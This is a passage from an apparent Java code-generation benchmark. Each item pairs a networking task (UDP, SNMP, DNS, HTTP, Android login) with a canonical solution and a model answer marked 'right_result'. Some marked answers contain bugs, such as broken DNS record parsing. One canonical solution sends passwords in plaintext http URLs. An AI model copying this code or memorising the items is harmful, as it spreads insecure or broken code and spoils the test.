hexInfoHash) {\n        // Implement response handling logic here\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n\n    public UDPAnnounceRequestMessage buildAnnounceRequest(AnnounceRequestMessage.RequestEvent event, AnnounceableInformation torrent, Peer peer) {\n        // Implement request building logic here\n        return new UDPAnnounceRequestMessage();\n    }\n\n    public void validateTrackerResponse(TrackerMessage message) {\n        // Implement validation logic here\n    }\n\n    public void handleTrackerConnectResponse(TrackerMessage message) {\n        // Implement connect response handling here\n    }\n\n    public void send(ByteBuffer data) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data.array(), data.limit(), address);\n        socket.send(packet);\n    }\n\n    public ByteBuffer recv(int attempt) throws IOException, SocketTimeoutException {\n        socket.setSoTimeout(UDP_BASE_TIMEOUT_SECONDS * 1000);\n        byte[] buffer = new byte[UDP_PACKET_LENGTH];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        ByteBuffer response = ByteBuffer.wrap(packet.getData(), 0, packet.getLength());\n        return response;\n    }\n}\n\nclass Peer {\n    // Peer class implementation\n}\n\nclass AnnounceableInformation {\n    // Announceable information class implementation\n}\n\nenum RequestEvent {\n    STARTED,\n    STOPPED,\n    COMPLETED\n}\n\nclass AnnounceRequestMessage {\n    enum RequestEvent {\n        STARTED,\n        STOPPED,\n        COMPLETED\n    }\n}\n\nclass TrackerMessage {\n    // Tracker message class implementation\n}\n\nclass UDPAnnounceRequestMessage {\n    // UDP announce request message class implementation\n}\n```"
  },
  {
    "Task_id": 611,
    "Instruction": "Task Description: Implement a UDP communication handler class that facilitates sending UDP messages and manages socket resources.\n\nClass Description: The UdpCommunicationHandler class provides functionality for sending UDP messages to a specified IP address and port, and includes methods for proper socket cleanup. It's designed for scenarios where a client needs to send confirmation messages to a server.\n\nAttributes:\n- mDatagramSocket: DatagramSocket - The UDP socket used for communication\n\nMethods:\n- sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) -> void - Sends a predefined success message (MSG_FILE_RECEIVER_INIT_SUCCESS) to the specified IP address and port. The socket is created on a port number that's one higher than the target port. Throws Exception if communication fails.\n- closeSocket() -> void - Closes and cleans up the DatagramSocket resource if it exists. This method should be called when the communication is complete to release system resources.\n\nInput:\n- For sendFileReceiverInitSuccessMsg: IpPortInfo object containing target IP address (InetAddress) and port number (int)\n- For closeSocket: None\n\nOutput:\n- For sendFileReceiverInitSuccessMsg: None (void), but sends UDP packet to specified destination\n- For closeSocket: None (void)",
    "Canonical_solution": "import android.util.Log;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n\n    public void sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) throws Exception {\n        Log.i(\"UdpCommunicationHandler\", \"sendFileReceiverInitSuccessMsg------>>>start\");\n        mDatagramSocket = new DatagramSocket(ipPortInfo.getPort() + 1);\n        byte[] sendData = Constant.MSG_FILE_RECEIVER_INIT_SUCCESS.getBytes(BaseTransfer.UTF_8);\n        DatagramPacket sendPacket = new DatagramPacket(\n            sendData, \n            sendData.length, \n            ipPortInfo.getInetAddress(), \n            ipPortInfo.getPort()\n        );\n        mDatagramSocket.send(sendPacket);\n        Log.i(\"UdpCommunicationHandler\", \"Send Msg To FileSender######>>>\" + Constant.MSG_FILE_RECEIVER_INIT_SUCCESS);\n        Log.i(\"UdpCommunicationHandler\", \"sendFileReceiverInitSuccessMsg------>>>end\");\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null) {\n            mDatagramSocket.disconnect();\n            mDatagramSocket.close();\n            mDatagramSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n    private static final String MSG_FILE_RECEIVER_INIT_SUCCESS = \"FILE_RECEIVER_INIT_SUCCESS\";\n    private DatagramSocket mDatagramSocket;\n\n    public void sendFileReceiverInitSuccessMsg(IpPortInfo ipPortInfo) throws Exception {\n        InetAddress targetAddress = ipPortInfo.getIpAddress();\n        int targetPort = ipPortInfo.getPort();\n\n        int localPort = targetPort + 1;\n        if (mDatagramSocket == null || mDatagramSocket.getLocalPort() != localPort) {\n            if (mDatagramSocket != null) {\n                mDatagramSocket.close();\n            }\n            mDatagramSocket = new DatagramSocket(localPort);\n        }\n\n        byte[] messageBytes = MSG_FILE_RECEIVER_INIT_SUCCESS.getBytes();\n        DatagramPacket packet = new DatagramPacket(messageBytes, messageBytes.length, targetAddress, targetPort);\n        mDatagramSocket.send(packet);\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null && !mDatagramSocket.isClosed()) {\n            mDatagramSocket.close();\n        }\n    }\n}\n\nclass IpPortInfo {\n    private InetAddress ipAddress;\n    private int port;\n\n    public IpPortInfo(InetAddress ipAddress, int port) {\n        this.ipAddress = ipAddress;\n        this.port = port;\n    }\n\n    public InetAddress getIpAddress() {\n        return ipAddress;\n    }\n\n    public int getPort() {\n        return port;\n    }\n}\n```"
  },
  {
    "Task_id": 612,
    "Instruction": "Task Description: Create a UDP server class in Java that can send messages to a specified target host and port using UDP protocol.\n\nClass Description: The UDPServer class implements a simple UDP server that can send messages to other hosts. It encapsulates the Java DatagramSocket functionality for UDP communication.\n\nAttributes:\n- socket: DatagramSocket - The UDP socket used for communication\n- port: int - The port number the server is bound to\n\nMethods:\n- UDPServer(int port) -> void - Constructor that creates a DatagramSocket bound to the specified port\n- send(String message, String targetHost, int targetPort) -> void - Sends a message to the specified target host and port using UDP\n- close() -> void - Closes the UDP socket and releases system resources",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPServer {\n\n    private DatagramSocket socket;\n    private int port;\n\n    public UDPServer(int port) throws Exception {\n        this.port = port;\n        this.socket = new DatagramSocket(port);\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        DatagramPacket packet = new DatagramPacket(\n            message.getBytes(),\n            message.length(),\n            InetAddress.getByName(targetHost),\n            targetPort\n        );\n        socket.send(packet);\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPServer {\n    private DatagramSocket socket;\n    private int port;\n\n    public UDPServer(int port) throws Exception {\n        this.socket = new DatagramSocket(port);\n        this.port = port;\n    }\n\n    public void send(String message, String targetHost, int targetPort) throws Exception {\n        InetAddress address = InetAddress.getByName(targetHost);\n        byte[] buffer = message.getBytes();\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, targetPort);\n        socket.send(packet);\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 613,
    "Instruction": "Task Description: Create a Java class that implements a UDP socket for SNMP communication, capable of sending and receiving datagram packets asynchronously while handling errors and resource cleanup properly.\n\nClass Description: The SnmpSocket class provides UDP socket functionality for SNMP communication, managing packet transmission and reception in a separate thread. It includes methods for sending packets, checking socket validity, and proper resource cleanup. The class implements Runnable to handle incoming packets asynchronously.\n\nAttributes:\n_socket: [DatagramSocket] - The UDP socket instance for communication\n_dgramHdlr: [SnmpResponseHandler] - Handler for processing received datagrams\n_sockThread: [Thread] - Thread for asynchronous packet reception\n_buffer: [byte[]] - Buffer for storing incoming packet data\nisClosing: [boolean] - Flag indicating if the socket is being closed\n_socketPort: [int] - Port number the socket is bound to\nresponseBufSize: [int] - Size of the response buffer\n\nMethods:\nConstructor: [SnmpSocket](SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) -> [void] - Initializes the UDP socket and starts the receiver thread\nsendPacket: [sendPacket](byte[] buff, int length, InetAddress addr, int port) -> [void] - Sends a datagram packet with specified data to given address and port\nsendPacket: [sendPacket](DatagramPacket dgrmpkt) -> [void] - Sends a prepared datagram packet\nisValid: [isValid]() -> [boolean] - Checks if the socket is in a valid state\nclose: [close]() -> [void] - Closes the socket and cleans up resources\nrun: [run]() -> [void] - Main thread method for receiving packets (implements Runnable)\nfinalize: [finalize]() -> [void] - Ensures proper cleanup when object is garbage collected\nhandleJavaError: [handleJavaError](Throwable thr) -> [void] - Handles Java errors during operation\nhandleDatagram: [handleDatagram](DatagramPacket dgrmpkt) -> [void] - Processes received datagrams using the response handler",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.SocketException;\nimport java.io.IOException;\nimport java.util.logging.Level;\n\nfinal class SnmpSocket implements java.lang.Runnable {\n\n    private DatagramSocket _socket = null;\n    private SnmpResponseHandler _dgramHdlr = null;\n    private Thread _sockThread = null;\n    private byte[] _buffer = null;\n    private transient boolean isClosing = false;\n\n    int _socketPort = 0;\n    int responseBufSize = 1024;\n\n    public SnmpSocket(SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) throws SocketException {\n        _socket = new DatagramSocket(0, addr);\n        _socketPort = _socket.getLocalPort();\n        responseBufSize = bufferSize;\n        _buffer = new byte[responseBufSize];\n        _dgramHdlr = rspHdlr;\n        _sockThread = new Thread(this, \"SnmpSocket\");\n        _sockThread.start();\n    }\n\n    public synchronized void sendPacket(byte[] buff, int length, InetAddress addr, int port) throws IOException {\n        DatagramPacket dgrmpkt = new DatagramPacket(buff, length, addr, port);\n        sendPacket(dgrmpkt);\n    }\n\n    public synchronized void sendPacket(DatagramPacket dgrmpkt) throws IOException {\n        if (isValid()) {\n            _socket.send(dgrmpkt);\n        } else {\n            throw new IOException(\"Invalid state of SNMP datagram socket.\");\n        }\n    }\n\n    public synchronized boolean isValid() {\n        return _socket != null && _sockThread != null && _sockThread.isAlive();\n    }\n\n    public synchronized void close() {\n        isClosing = true;\n        if (_socket != null) {\n            _socket.close();\n            _socket = null;\n        }\n        if (_sockThread != null && _sockThread.isAlive()) {\n            _sockThread.interrupt();\n            try {\n                _sockThread.join();\n            } catch (InterruptedException e) {\n            }\n            _sockThread = null;\n        }\n    }\n\n    @Override\n    public void run() {\n        Thread.currentThread().setPriority(8);\n        while (true) {\n            try {\n                DatagramPacket dgrmpkt = new DatagramPacket(_buffer, _buffer.length);\n                _socket.receive(dgrmpkt);\n                if (isClosing)\n                    break;\n                if (dgrmpkt.getLength() <= 0)\n                    continue;\n                handleDatagram(dgrmpkt);\n                if (isClosing)\n                    break;\n            } catch (IOException io) {\n                if (isClosing) {\n                    break;\n                }\n            } catch (Exception e) {\n                if (isClosing) {\n                    break;\n                }\n            } catch (ThreadDeath d) {\n                close();\n                throw d;\n            } catch (Error err) {\n                handleJavaError(err);\n            }\n        }\n    }\n\n    @Override\n    protected synchronized void finalize() {\n        close();\n    }\n\n    private synchronized void handleJavaError(Throwable thr) {\n        if (thr instanceof OutOfMemoryError) {\n            Thread.yield();\n            return;\n        }\n        if (_socket != null) {\n            _socket.close();\n            _socket = null;\n        }\n        Thread.yield();\n    }\n\n    private synchronized void handleDatagram(DatagramPacket dgrmpkt) {\n        _dgramHdlr.processDatagram(dgrmpkt);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.io.IOException;\n\npublic class SnmpSocket implements Runnable {\n    private DatagramSocket _socket;\n    private SnmpResponseHandler _dgramHdlr;\n    private Thread _sockThread;\n    private byte[] _buffer;\n    private volatile boolean isClosing;\n    private int _socketPort;\n    private int responseBufSize;\n\n    public SnmpSocket(SnmpResponseHandler rspHdlr, InetAddress addr, int bufferSize) throws SocketException, UnknownHostException {\n        _dgramHdlr = rspHdlr;\n        responseBufSize = bufferSize;\n        _buffer = new byte[bufferSize];\n        _socket = new DatagramSocket(addr, 0);\n        _socketPort = _socket.getLocalPort();\n        _sockThread = new Thread(this);\n        _sockThread.start();\n    }\n\n    public void sendPacket(byte[] buff, int length, InetAddress addr, int port) {\n        try {\n            DatagramPacket packet = new DatagramPacket(buff, length, addr, port);\n            _socket.send(packet);\n        } catch (IOException e) {\n            handleJavaError(e);\n        }\n    }\n\n    public void sendPacket(DatagramPacket dgrmpkt) {\n        try {\n            _socket.send(dgrmpkt);\n        } catch (IOException e) {\n            handleJavaError(e);\n        }\n    }\n\n    public boolean isValid() {\n        return _socket != null && !_socket.isClosed();\n    }\n\n    public void close() {\n        if (isClosing)\n            return;\n        isClosing = true;\n        if (_socket != null && !_socket.isClosed()) {\n            _socket.close();\n        }\n        try {\n            _sockThread.join(1000);\n        } catch (InterruptedException e) {\n            handleJavaError(e);\n        }\n    }\n\n    @Override\n    public void run() {\n        while (!isClosing) {\n            try {\n                DatagramPacket packet = new DatagramPacket(_buffer, _buffer.length);\n                _socket.receive(packet);\n                handleDatagram(packet);\n            } catch (IOException e) {\n                if (isClosing)\n                    break;\n                handleJavaError(e);\n            }\n        }\n    }\n\n    protected void finalize() {\n        close();\n    }\n\n    private void handleJavaError(Throwable thr) {\n        thr.printStackTrace();\n    }\n\n    private void handleDatagram(DatagramPacket dgrmpkt) {\n        if (_dgramHdlr != null) {\n            _dgramHdlr.handleResponse(dgrmpkt.getData(), dgrmpkt.getLength(), dgrmpkt.getAddress(), dgrmpkt.getPort());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 615,
    "Instruction": "Task Description: Implement a DNS UDP client class that can resolve DNS queries (A records and TXT records) by communicating with DNS servers over UDP.\n\nClass Description: The DnsUdpClient class provides functionality to send DNS queries to specified DNS servers and process the responses. It supports resolving domain names to IPv4 addresses (A records) and retrieving text records (TXT records).\n\nAttributes:\nDNS_SERVERS: InetSocketAddress[] - An array of predefined DNS server addresses with their respective ports\n\nMethods:\nresolveAOverUdp: resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) -> List<Inet4Address> - Resolves a DNS A record query by sending it to the specified DNS server and returns a list of IPv4 addresses. Throws Exception if the operation fails.\n\ntoIps: toIps(byte[] buffer) -> List<Inet4Address> - Helper method that converts DNS response data into a list of IPv4 addresses by parsing A records.\n\nresolveTXTOverUdp: resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) -> String - Resolves a DNS TXT record query by sending it to the specified DNS server and returns the text content. Throws Exception if the operation fails.\n\ntoTXT: toTXT(byte[] buffer) -> String - Helper method that extracts TXT record data from DNS response and returns it as a string. Throws RuntimeException if no TXT record is found.",
    "Canonical_solution": "import net.sf.ivmaidns.dns.DNSConnection;\nimport net.sf.ivmaidns.dns.DNSMsgHeader;\nimport net.sf.ivmaidns.dns.DNSName;\nimport net.sf.ivmaidns.dns.DNSRecord;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DnsUdpClient {\n    private final static InetSocketAddress[] DNS_SERVERS = new InetSocketAddress[]{\n            new InetSocketAddress(\"8.8.8.8\", 53),\n            new InetSocketAddress(\"208.67.222.222\", 443),\n            new InetSocketAddress(\"208.67.220.220\", 443),\n            new InetSocketAddress(\"199.91.73.222\", 3389),\n            new InetSocketAddress(\"87.118.100.175\", 110),\n            new InetSocketAddress(\"87.118.85.241\", 110),\n            new InetSocketAddress(\"77.109.139.29\", 110),\n            new InetSocketAddress(\"77.109.138.45\", 110)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(1000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toIps(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private List<Inet4Address> toIps(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        List<Inet4Address> ips = new ArrayList<Inet4Address>();\n        for (DNSRecord record : records) {\n            if (DNSRecord.A == record.getRType()) {\n                if (record.getRData().length > 0) {\n                    ips.add((Inet4Address) record.getRData()[0]);\n                }\n            }\n        }\n        return ips;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.setSoTimeout(2000);\n        try {\n            datagramSocket.connect(dnsServer.getAddress(), dnsServer.getPort());\n            datagramSocket.send(new DatagramPacket(query, query.length));\n            DatagramPacket packet = new DatagramPacket(new byte[2048], 2048);\n            datagramSocket.receive(packet);\n            return toTXT(packet.getData());\n        } finally {\n            datagramSocket.close();\n        }\n    }\n\n    private String toTXT(byte[] buffer) {\n        DNSRecord[] records = DNSConnection.decode(buffer);\n        for (DNSRecord record : records) {\n            if (DNSRecord.TXT == record.getRType() && record.getRData().length > 0) {\n                return (String) record.getRData()[0];\n            }\n        }\n        throw new RuntimeException(\"not found\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DnsUdpClient {\n    public static final InetSocketAddress[] DNS_SERVERS = new InetSocketAddress[]{\n            new InetSocketAddress(\"8.8.8.8\", 53),\n            new InetSocketAddress(\"1.1.1.1\", 53)\n    };\n\n    public List<Inet4Address> resolveAOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        try {\n            DatagramPacket packet = new DatagramPacket(query, query.length, dnsServer);\n            socket.send(packet);\n\n            byte[] responseBuffer = new byte[512];\n            DatagramPacket responsePacket = new DatagramPacket(responseBuffer, responseBuffer.length);\n            socket.receive(responsePacket);\n\n            return toIps(responsePacket.getData());\n        } finally {\n            socket.close();\n        }\n    }\n\n    public List<Inet4Address> toIps(byte[] buffer) {\n        List<Inet4Address> ips = new ArrayList<>();\n        ByteBuffer bb = ByteBuffer.wrap(buffer);\n\n        int pos = 12; // Skip header\n\n        while (pos < buffer.length) {\n            if ((buffer[pos] & 0xC0) == 0xC0) break; // End of resource records\n            pos += getDomainNameLength(buffer, pos);\n            pos += 4; // Skip type and class\n\n            int ttl = bb.getInt(pos); pos += 4;\n            int rdLength = bb.getShort(pos); pos += 2;\n\n            if (buffer[pos - 6] == 1) { // A record\n                for (int i = 0; i < rdLength; i += 4) {\n                    byte[] ipBytes = new byte[]{buffer[pos + i], buffer[pos + i + 1], buffer[pos + i + 2], buffer[pos + i + 3]};\n                    try {\n                        ips.add((Inet4Address) InetAddress.getByAddress(ipBytes));\n                    } catch (Exception e) {\n                        // Ignore invalid IPs\n                    }\n                }\n            }\n            pos += rdLength;\n        }\n        return ips;\n    }\n\n    private int getDomainNameLength(byte[] buffer, int offset) {\n        int len;\n        do {\n            len = buffer[offset++] & 0xFF;\n            offset += len;\n        } while (len != 0);\n        return offset;\n    }\n\n    public String resolveTXTOverUdp(InetSocketAddress dnsServer, byte[] query) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        try {\n            DatagramPacket packet = new DatagramPacket(query, query.length, dnsServer);\n            socket.send(packet);\n\n            byte[] responseBuffer = new byte[512];\n            DatagramPacket responsePacket = new DatagramPacket(responseBuffer, responseBuffer.length);\n            socket.receive(responsePacket);\n\n            return toTXT(responsePacket.getData());\n        } finally {\n            socket.close();\n        }\n    }\n\n    public String toTXT(byte[] buffer) {\n        StringBuilder txt = new StringBuilder();\n        ByteBuffer bb = ByteBuffer.wrap(buffer);\n        int pos = 12; // Skip header\n\n        while (pos < buffer.length) {\n            if ((buffer[pos] & 0xC0) == 0xC0) break; // End of resource records\n            pos += getDomainNameLength(buffer, pos);\n            pos += 4; // Skip type and class\n\n            int ttl = bb.getInt(pos); pos += 4;\n            int rdLength = bb.getShort(pos); pos += 2;\n\n            if (buffer[pos - 6] == 16) { // TXT record\n                for (int i = 0; i < rdLength; i++) {\n                    int length = buffer[pos++];\n                    if (length > 0) {\n                        for (int j = 0; j < length; j++) {\n                            txt.append((char) buffer[pos++]);\n                        }\n                    }\n                }\n                return txt.toString();\n            }\n            pos += rdLength;\n        }\n        throw new RuntimeException(\"No TXT record found\");\n    }\n}\n```"
  },
  {
    "Task_id": 63,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for sending feedback data to a remote server using HttpURLConnection.\n\nClass Description: The HttpFeedbackClient class provides functionality to send feedback content and environment information to a specified URL via HTTP POST request. It handles connection setup, parameter encoding, request sending, and response handling with appropriate callbacks for success or failure scenarios.\n\nAttributes:\ncontent: String - The feedback content to be sent to the server\nenv: String - The environment information associated with the feedback\ncallback: OnRequestCallback - The callback interface for handling request results\n\nMethods:\nsendFeedback: sendFeedback() -> void - Sends the feedback data to the server. Sets up the HTTP connection, encodes parameters, writes the request body, and processes the response. Calls onSuccess() or onFailure() on the callback object depending on the outcome.\n\nNote: The OnRequestCallback interface (not shown in the reference code) would typically contain two methods:\n- onSuccess(): Called when the request completes successfully\n- onFailure(Exception e): Called when the request fails, with the exception that occurred",
    "Canonical_solution": "import com.antfortune.freeline.idea.utils.NotificationUtils;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\n\npublic class HttpFeedbackClient {\n\n    private String content;\n    private String env;\n    private OnRequestCallback callback;\n\n    public HttpFeedbackClient(String content, String env, OnRequestCallback callback) {\n        this.content = content;\n        this.env = env;\n        this.callback = callback;\n    }\n\n    public void sendFeedback() {\n        try {\n            URL url = new URL(\"https://www.freelinebuild.com/api/feedback\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setReadTimeout(10000);\n            conn.setConnectTimeout(15000);\n            conn.setRequestMethod(\"POST\");\n            conn.setDoInput(true);\n            conn.setDoOutput(true);\n\n            StringBuilder builder = new StringBuilder();\n            builder.append(URLEncoder.encode(\"content\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(content, \"UTF-8\"));\n            builder.append(\"&\");\n            builder.append(URLEncoder.encode(\"env\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(env, \"UTF-8\"));\n\n            OutputStream os = conn.getOutputStream();\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, \"UTF-8\"));\n            writer.write(builder.toString());\n            writer.flush();\n            writer.close();\n            os.close();\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 400) {\n                this.callback.onFailure(new Exception(conn.getResponseMessage()));\n            } else {\n                this.callback.onSuccess();\n            }\n            conn.disconnect();\n        } catch (IOException e) {\n            this.callback.onFailure(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\n\npublic class HttpFeedbackClient {\n    private String content;\n    private String env;\n    private OnRequestCallback callback;\n\n    public HttpFeedbackClient(String content, String env, OnRequestCallback callback) {\n        this.content = content;\n        this.env = env;\n        this.callback = callback;\n    }\n\n    public void sendFeedback() {\n        new Thread(() -> {\n            HttpURLConnection connection = null;\n            try {\n                URL url = new URL(\"https://example.com/feedback\");\n                connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(\"POST\");\n                connection.setDoOutput(true);\n                connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n                String postData = \"content=\" + URLEncoder.encode(content, StandardCharsets.UTF_8)\n                        + \"&env=\" + URLEncoder.encode(env, StandardCharsets.UTF_8);\n\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = postData.getBytes(StandardCharsets.UTF_8);\n                    os.write(input, 0, input.length);\n                }\n\n                int responseCode = connection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {\n                        StringBuilder response = new StringBuilder();\n                        String line;\n                        while ((line = in.readLine()) != null) {\n                            response.append(line);\n                        }\n                        callback.onSuccess();\n                    }\n                } else {\n                    callback.onFailure(new IOException(\"Server returned HTTP code: \" + responseCode));\n                }\n            } catch (Exception e) {\n                callback.onFailure(e);\n            } finally {\n                if (connection != null) {\n                    connection.disconnect();\n                }\n            }\n        }).start();\n    }\n\n    public interface OnRequestCallback {\n        void onSuccess();\n\n        void onFailure(Exception e);\n    }\n}\n```"
  },
  {
    "Task_id": 66,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously using HttpURLConnection, specifically designed for Android applications to fetch and process JSON data from a server.\n\nClass Description: HttpRequestHandler is a utility class containing an inner AsyncTask subclass (MyAsyncTaskgetNews) that performs HTTP GET requests in the background. It handles connection setup, timeout configuration, input stream processing, and JSON response parsing. The class demonstrates typical operations for user authentication flows.\n\nAttributes:\n- None (All required objects are created locally within methods)\n\nMethods:\n- MyAsyncTaskgetNews: [Inner Class] - Extends AsyncTask<String, String, String> to perform network operations off the UI thread\n  - doInBackground(String... params) -> String - Main execution method that:\n    1. Takes URL string as input parameter\n    2. Establishes HTTP connection with 7-second timeout\n    3. Reads input stream and converts to string\n    4. Publishes progress with response data\n    5. Returns null (results handled via progress updates)\n  \n  - onProgressUpdate(String... progress) -> void - UI thread callback that:\n    1. Parses JSON response\n    2. Handles \"user is added\" case by showing toast and initiating login\n    3. Processes successful login by saving user credentials\n    4. Handles errors via logging\n\nNote: The class assumes existence of helper classes (Operations for stream conversion, SaveSettings for persistence) and Android context availability via getApplicationContext().",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    Operations operations = new Operations(getApplicationContext());\n                    NewsData = operations.ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n                if (json.getString(\"msg\") == null)\n                    return;\n                if (json.getString(\"msg\").equalsIgnoreCase(\"user is added\")) {\n                    Toast.makeText(getApplicationContext(), json.getString(\"msg\"), Toast.LENGTH_LONG).show();\n                    String url = \"http://10.0.2.2/~hussienalrubaye/twitterserver/login.php?email=\" + etEmail.getText().toString() + \"&password=\" + etPassword.getText().toString();\n                    new MyAsyncTaskgetNews().execute(url);\n                }\n\n                if (json.getString(\"msg\").equalsIgnoreCase(\"Pass Login\")) {\n                    JSONArray UserInfo = new JSONArray(json.getString(\"info\"));\n                    JSONObject UserCreintal = UserInfo.getJSONObject(0);\n                    hideProgressDialog();\n                    SaveSettings saveSettings = new SaveSettings(getApplicationContext());\n                    saveSettings.SaveData(UserCreintal.getString(\"user_id\"));\n                    finish();\n                }\n            } catch (Exception ex) {\n                Log.d(\"er\", ex.getMessage());\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport android.content.Context;\nimport android.os.AsyncTask;\nimport android.util.Log;\nimport android.widget.Toast;\n\nimport org.json.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        private static final int TIMEOUT = 7000;\n\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                URL url = new URL(params[0]);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(\"GET\");\n                connection.setConnectTimeout(TIMEOUT);\n                connection.setReadTimeout(TIMEOUT);\n\n                int responseCode = connection.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                    StringBuilder response = new StringBuilder();\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        response.append(line);\n                    }\n                    reader.close();\n                    publishProgress(response.toString());\n                } else {\n                    publishProgress(\"Error: \" + responseCode);\n                }\n                connection.disconnect();\n            } catch (Exception e) {\n                Log.e(\"HttpRequestHandler\", \"doInBackground error\", e);\n                publishProgress(\"Network error\");\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            super.onProgressUpdate(progress);\n            String jsonStr = progress[0];\n            try {\n                JSONObject jsonObject = new JSONObject(jsonStr);\n                String status = jsonObject.optString(\"status\");\n\n                if (\"user is added\".equals(status)) {\n                    Toast.makeText(getApplicationContext(), \"User added successfully!\", Toast.LENGTH_SHORT).show();\n                    // Assume initiateLogin() triggers login flow\n                    initiateLogin(jsonObject.getJSONObject(\"user\"));\n                } else if (\"success\".equals(status)) {\n                    SaveSettings.saveUserCredentials(getApplicationContext(), jsonObject.getJSONObject(\"user\"));\n                } else 